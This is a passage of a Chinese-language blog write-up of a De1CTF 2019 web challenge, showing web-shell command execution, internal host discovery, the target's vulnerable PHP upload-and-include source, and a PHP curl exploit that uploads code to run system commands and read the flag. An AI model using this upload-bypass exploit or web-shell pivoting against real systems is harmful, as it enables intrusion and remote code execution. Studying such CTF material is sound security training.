+<p>然后访问/upload，嗯，发现shell传上去了<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/1.jpg" alt="img"></p>
+<p>执行<code>ifconfig</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:ac:16:00:03  </span><br><span class="line">          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:4208 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2498 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:584383 (584.3 KB)  TX bytes:505635 (505.6 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:78 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:78 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:11067 (11.0 KB)  TX bytes:11067 (11.0 KB)</span><br></pre></td></tr></table></figure>
+<p>内网地址是<code>172.22.0.3</code>，ping一下其他，发现<code>172.22.0.2</code>主机存活，蚁剑扫描端口<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/2.jpg" alt="img"></p>
+<p>80开着！<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/3.jpg" alt="img"></p>
+<p>用马执行一下 <code>curl http://172.22.0.2</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">        $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>($_);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>又是原题</p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/5.jpg" alt="img"></p>
+<p>直接上payload<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/4.png" alt="img"></p>
+<p>用postman 工具转请求为php curl</p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/8.png" alt="img"></p>
+<p>传上去，然后传<code>tinmin=system(&#39;php exp.php&#39;);</code><br>找到flag</p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/6.jpg" alt="img"></p>
+<p>改一下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL =&gt; &quot;http://172.22.0.2&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">  CURLOPT_ENCODING =&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;tinmin.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php system(&apos;cat /etc/flag_is_He4e_89587236.txt&apos;);\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;hello\&quot;\r\n\r\ntinmin.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[0]\&quot;\r\n\r\n/../tinmin.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;submit\&quot;\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; array(</span><br><span class="line">    &quot;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&quot;,</span><br><span class="line">    &quot;cache-control: no-cache&quot;,</span><br><span class="line">    &quot;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/De1ctf2019/7.jpg" alt="img"></p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFme"><span class="toc-text">SSRFme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshellshell"><span class="toc-text">shellshellshell</span></a></li></ol>
+  </div>
+</aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
+     
+      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="http://ruanyifeng.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/design-patterns/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://juejin.im/user/5b91fcf06fb9a05d3c7fd4a5" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://segmentfault.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 954093370@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+          
+            <div>
+              <img src="/images/wechat.jpg" alt="WeChat">
+              
+                <p>WeChat</p>
+              
+            </div>
+          
+            <div>
+              <img src="/images/alipay.png" alt="AliPay">
+              
+                <p>AliPay</p>
+              
+            </div>
+          
+        </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2019/08/21/2019-8-21-CTF/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/05/04/2019-5-4-CTF-md/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+      <a href="javascript:void(0);" id="site-reward">
+        <i class="fa fa-thumbs-up"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
